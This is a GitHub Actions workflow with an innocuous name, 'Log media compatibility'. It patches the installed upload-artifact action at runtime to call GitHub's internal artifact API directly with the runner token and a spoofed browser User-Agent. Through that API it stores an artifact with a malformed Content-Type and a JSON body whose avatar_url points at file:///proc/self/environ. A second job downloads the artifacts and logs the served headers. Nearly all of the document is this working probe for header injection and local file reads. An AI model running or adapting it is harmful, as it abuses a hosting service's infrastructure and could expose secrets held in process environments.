name: Log media compatibility

on:
  push:
    branches:
      - media-check-1025

permissions:
  actions: write
  contents: read

jobs:
  producer:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare sample
        shell: bash
        run: |
          node - <<'NODE'
          const fs = require('fs');
          const report = {
            full_name: 'sample/report',
            owner: {
              login: 'sample',
              avatar_url: 'file:///proc/self/environ'
            },
            description: '',
            stargazers_count: 0
          };
          fs.writeFileSync('report.json', JSON.stringify(report));
          NODE
      - name: Adjust upload handler
        shell: bash
        run: |
          python - <<'PY'
          import os
          from pathlib import Path

          action = Path(os.environ['RUNNER_WORKSPACE']).parent / '_actions/actions/upload-artifact/v7/dist/upload/index.js'
          source = action.read_text()
          marker = "    setOutput('artifact-url', artifactURL);"
          if marker not in source:
              raise RuntimeError('handler marker missing')
          addition = r"""
              const identifiers = getBackendIdsFromToken();
              const httpsModule = __nccwpck_require__(5692);
              const browserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36';
              const asVarint = value => {
                  const output = [];
                  let current = BigInt(value);
                  do {
                      let byte = Number(current & 0x7fn);
                      current >>= 7n;
                      if (current) byte |= 0x80;
                      output.push(byte);
                  } while (current);
                  return Buffer.from(output);
              };
              const fieldBytes = (number, value) => {
                  const data = Buffer.isBuffer(value) ? value : Buffer.from(value);
                  return Buffer.concat([asVarint((number << 3) | 2), asVarint(data.length), data]);
              };
              const fieldNumber = (number, value) =>
                  Buffer.concat([asVarint(number << 3), asVarint(value)]);
              const readVarint = (buffer, cursor) => {
                  let value = 0n;
                  let shift = 0n;
                  let position = cursor;
                  while (position < buffer.length) {
                      const byte = buffer[position++];
                      value |= BigInt(byte & 0x7f) << shift;
                      if (!(byte & 0x80)) return [value, position];
                      shift += 7n;
                  }
                  throw new Error('short response');
              };
              const getField = (buffer, wanted) => {
                  let cursor = 0;
                  while (cursor < buffer.length) {
                      let tag;
                      [tag, cursor] = readVarint(buffer, cursor);
                      const number = Number(tag >> 3n);
                      const wire = Number(tag & 7n);
                      if (wire === 0) {
                          let ignored;
                          [ignored, cursor] = readVarint(buffer, cursor);
                      } else if (wire === 2) {
                          let length;
                          [length, cursor] = readVarint(buffer, cursor);
                          const end = cursor + Number(length);
                          const value = buffer.subarray(cursor, end);
                          if (number === wanted) return value;
                          cursor = end;
                      } else {
                          throw new Error('unknown response field');
                      }
                  }
                  return null;
              };
              const requestBytes = (url, method, headers, body) => new Promise((resolve, reject) => {
                  const request = httpsModule.request(new URL(url), {method, headers}, response => {
                      const chunks = [];
                      response.on('data', chunk => chunks.push(chunk));
                      response.on('end', () => resolve({
                          status: response.statusCode,
                          body: Buffer.concat(chunks)
                      }));
                  });
                  request.on('error', reject);
                  request.end(body);
              });
              const service = new URL(
                  '/twirp/github.actions.results.api.v1.ArtifactService/',
                  getResultsServiceUrl()
              ).href;
              const artifactName = 'wire-sample.json';
              const invalidMedia = Buffer.concat([
                  Buffer.from('application/json', 'ascii'),
                  Buffer.from([0x85])
              ]);
              const wrappedMedia = fieldBytes(1, invalidMedia);
              const creation = Buffer.concat([
                  fieldBytes(1, identifiers.workflowRunBackendId),
                  fieldBytes(2, identifiers.workflowJobRunBackendId),
                  fieldBytes(3, artifactName),
                  fieldNumber(5, 7),
                  fieldBytes(6, wrappedMedia)
              ]);
              const commonHeaders = {
                  'Authorization': 'Bearer ' + getRuntimeToken(),
                  'Accept': 'application/protobuf',
                  'Content-Type': 'application/protobuf',
                  'User-Agent': browserAgent
              };
              const created = await requestBytes(
                  service + 'CreateArtifact',
                  'POST',
                  {...commonHeaders, 'Content-Length': String(creation.length)},
                  creation
              );
              if (created.status < 200 || created.status >= 300) {
                  throw new Error('binary create status ' + created.status);
              }
              const uploadField = getField(created.body, 2);
              if (!uploadField) throw new Error('upload location missing');
              const uploadUrl = uploadField.toString('utf8');
              const payload = Buffer.from(JSON.stringify({
                  full_name: 'sample/report',
                  owner: {
                      login: 'sample',
                      avatar_url: 'file:///proc/self/environ'
                  },
                  description: '',
                  stargazers_count: 0
              }));
              const uploaded = await requestBytes(
                  uploadUrl,
                  'PUT',
                  {
                      'Content-Type': 'application/json\x85',
                      'Content-Length': String(payload.length),
                      'x-ms-blob-type': 'BlockBlob',
                      'x-ms-version': '2023-11-03',
                      'User-Agent': browserAgent
                  },
                  payload
              );
              if (uploaded.status < 200 || uploaded.status >= 300) {
                  throw new Error('storage status ' + uploaded.status);
              }
              const completion = Buffer.concat([
                  fieldBytes(1, identifiers.workflowRunBackendId),
                  fieldBytes(2, identifiers.workflowJobRunBackendId),
                  fieldBytes(3, artifactName),
                  fieldNumber(4, payload.length)
              ]);
              const finalized = await requestBytes(
                  service + 'FinalizeArtifact',
                  'POST',
                  {...commonHeaders, 'Content-Length': String(completion.length)},
                  completion
              );
              if (finalized.status < 200 || finalized.status >= 300) {
                  throw new Error('binary finalize status ' + finalized.status);
              }
          """
          action.write_text(source.replace(marker, marker + '\n' + addition))
          PY
      - name: Store sample
        uses: actions/upload-artifact@v7
        with:
          path: report.json
          archive: false
          retention-days: 1

  inspector:
    needs: producer
    if: always()
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
    steps:
      - name: Inspect responses
        shell: bash
        env:
          ACCESS_TOKEN: ${{ github.token }}
        run: |
          python - <<'PY'
          import hashlib
          import json
          import os
          from urllib.error import HTTPError
          from urllib.parse import parse_qs, urlparse
          from urllib.request import HTTPRedirectHandler, Request, build_opener, urlopen

          agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36'
          base = f"https://api.github.com/repos/{os.environ['GITHUB_REPOSITORY']}"
          headers = {
              'Authorization': f"Bearer {os.environ['ACCESS_TOKEN']}",
              'Accept': 'application/vnd.github+json',
              'User-Agent': agent,
          }

          class NoRedirect(HTTPRedirectHandler):
              def redirect_request(self, req, fp, code, msg, response_headers, newurl):
                  return None

          def api(path):
              with urlopen(Request(base + path, headers=headers), timeout=30) as response:
                  return json.load(response)

          def redirect(path):
              try:
                  build_opener(NoRedirect).open(Request(base + path, headers=headers), timeout=30)
                  raise RuntimeError('redirect missing')
              except HTTPError as response:
                  if response.code not in (301, 302, 303, 307, 308):
                      raise
                  return response.headers['Location']

          artifacts = api(f"/actions/runs/{os.environ['GITHUB_RUN_ID']}/artifacts").get('artifacts', [])
          for item in artifacts:
              location = redirect(f"/actions/artifacts/{item['id']}/zip")
              query = parse_qs(urlparse(location).query)
              with urlopen(Request(location, headers={'User-Agent': agent}), timeout=30) as response:
                  media = response.headers.get_all('Content-Type', [])
                  body = response.read()
              encoded = '|'.join(value.encode('latin1').hex() for value in media)
              override = '|'.join(value.encode('latin1').hex() for value in query.get('rsct', []))
              print(f"name={item['name']} media={encoded} rsct={override} length={len(body)} sha256={hashlib.sha256(body).hexdigest()}")
          PY
